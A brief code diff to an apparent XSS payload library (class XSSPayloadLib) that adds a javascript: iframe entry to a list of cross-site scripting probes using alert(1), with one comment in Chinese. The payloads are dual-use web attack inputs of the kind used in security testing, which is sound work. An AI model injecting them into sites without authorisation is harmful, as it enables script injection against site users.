@@ -37,6 +37,7 @@ class XSSPayloadLib:
         r"<img src=x onerror=alert(1)>",
         r"<svg/onload=alert(1)>",
         r"<body onpageshow=alert(1)>",
+        r"<iframe src='javascript:alert(1)'></iframe>",
         r"<iframe onload=alert(1)></iframe>",  # 现代 iframe 攻击首选
         r"<iframe srcdoc='<script>alert(1)</script>'></iframe>",
         r"<details open ontoggle=alert(1)>",
